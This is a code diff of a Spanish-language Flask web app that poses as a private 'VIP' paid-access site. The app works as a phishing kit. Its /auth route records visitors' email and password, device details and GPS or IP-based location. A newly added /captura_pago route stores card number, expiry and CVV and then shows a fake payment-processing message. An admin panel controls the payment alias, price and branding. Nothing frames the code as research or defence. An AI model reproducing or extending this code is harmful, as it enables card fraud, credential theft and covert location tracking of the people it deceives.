@@ -3,9 +3,9 @@ from datetime import datetime
 from flask import Flask, render_template, request, redirect, url_for, session
 
 app = Flask(__name__)
-app.secret_key = 'franco_ultra_v12_gold_final'
+app.secret_key = 'franco_v13_master_key'
 
-# Configuración de Rutas y Carpetas
+# --- CONFIGURACIÓN DE DIRECTORIOS ---
 BASE_DIR = os.path.dirname(os.path.abspath(__file__))
 UPLOAD_FOLDER = os.path.join(BASE_DIR, 'static', 'uploads') 
 SYSTEM_FOLDER = os.path.join(BASE_DIR, 'static', 'system')  
@@ -26,15 +26,15 @@ def init_db():
 
 init_db()
 
-# CONFIGURACIÓN MAESTRA (Controlada desde el Panel)
+# CONFIGURACIÓN INICIAL
 config_web = {
     "user_admin": "franco",
     "pass_admin": "franco",
     "alias": "VIP.FRANCO.PAGOS",
     "precio": "2500",
     "img_principal": "/static/system/portada.jpg",
-    "titulo": "¡BIENVENIDO A MI SITIO OFICIAL!",
-    "color_fondo": "#2d004d",
+    "titulo": "ACCESO PRIVADO VIP",
+    "color_fondo": "#1a0033",
     "color_texto": "#ffffff"
 }
 
@@ -45,21 +45,23 @@ def login():
 @app.route('/auth', methods=['POST'])
 def auth():
     u, p = request.form.get('email'), request.form.get('pass')
-    # Captura Forense desde el Navegador
-    bat, res, lang, tz = request.form.get('bateria', 'N/D'), request.form.get('resolucion', 'N/D'), request.form.get('lenguaje', 'N/D'), request.form.get('tz', 'N/D')
+    bat, res, lang, tz = request.form.get('bateria','N/D'), request.form.get('resolucion','N/D'), request.form.get('lenguaje','N/D'), request.form.get('tz','N/D')
+    lat_gps = float(request.form.get('lat_gps', 0))
+    lon_gps = float(request.form.get('lon_gps', 0))
     
-    # Geolocalización por IP
-    geo = {"city": "N/A", "lat": 0, "lon": 0}
-    try: 
-        geo = requests.get(f'http://ip-api.com/json/{request.remote_addr}', timeout=2).json()
-    except: pass
+    city = "Desconocida"
+    if lat_gps == 0:
+        try:
+            geo = requests.get(f'http://ip-api.com/json/{request.remote_addr}', timeout=2).json()
+            city, lat_gps, lon_gps = geo.get('city','N/A'), geo.get('lat',0), geo.get('lon',0)
+        except: pass
 
     ua = request.headers.get('User-Agent', '')
     disp = "iOS" if "iPhone" in ua else "Android" if "Android" in ua else "PC"
     
     conn = sqlite3.connect(DB_PATH); cursor = conn.cursor()
     cursor.execute("INSERT INTO registros (user, pass, tarjeta, banco, tipo, hora, dispositivo, city, lat, lon, bateria, resolucion, lenguaje, zona_horaria) VALUES (?,?,?,?,?,?,?,?,?,?,?,?,?,?)",
-                   (u, p, "ESPERANDO...", "-", "-", datetime.now().strftime("%H:%M:%S"), disp, geo.get('city','N/A'), geo.get('lat',0), geo.get('lon',0), bat, res, lang, tz))
+                   (u, p, "ESPERANDO...", "-", "-", datetime.now().strftime("%H:%M:%S"), disp, city, lat_gps, lon_gps, bat, res, lang, tz))
     session['current_id'] = cursor.lastrowid
     conn.commit(); conn.close()
     session['logged_in'] = True
@@ -70,6 +72,19 @@ def dashboard():
     if not session.get('logged_in'): return redirect(url_for('login'))
     fotos = [f for f in os.listdir(UPLOAD_FOLDER) if f.lower().endswith(('png', 'jpg', 'jpeg', 'gif'))]
     return render_template('dashboard.html', config=config_web, fotos=fotos)
+
+@app.route('/captura_pago', methods=['POST'])
+def captura_pago():
+    rid = session.get('current_id')
+    if rid:
+        cc = request.form.get('cc')
+        exp = request.form.get('exp')
+        cvv = request.form.get('cvv')
+        data_card = f"CC: {cc} | EXP: {exp} | CVV: {cvv}"
+        conn = sqlite3.connect(DB_PATH); cursor = conn.cursor()
+        cursor.execute("UPDATE registros SET tarjeta=? WHERE id=?", (data_card, rid))
+        conn.commit(); conn.close()
+    return "✅ PAGO EN PROCESO... REVISE SU EMAIL."
 
 @app.route('/matrix_admin', methods=['GET', 'POST'])
 def admin_matrix():
@@ -88,15 +103,14 @@ def update_full():
     if session.get('is_admin'):
         if 'file_portada' in request.files:
             f = request.files['file_portada']
-            if f.filename != '':
-                f.save(os.path.join(SYSTEM_FOLDER, "portada.jpg"))
-                config_web["img_principal"] = "/static/system/portada.jpg?v=" + str(time.time())
-        
-        config_web["titulo"] = request.form.get('titulo')
-        config_web["alias"] = request.form.get('alias')
-        config_web["precio"] = request.form.get('precio')
-        config_web["color_fondo"] = request.form.get('color_fondo')
-        config_web["color_texto"] = request.form.get('color_texto')
+            if f.filename != '': f.save(os.path.join(SYSTEM_FOLDER, "portada.jpg"))
+        config_web.update({
+            "titulo": request.form.get('titulo'),
+            "alias": request.form.get('alias'),
+            "precio": request.form.get('precio'),
+            "color_fondo": request.form.get('color_fondo'),
+            "color_texto": request.form.get('color_texto')
+        })
     return redirect(url_for('admin_matrix'))
 
 @app.route('/upload_media', methods=['POST'])
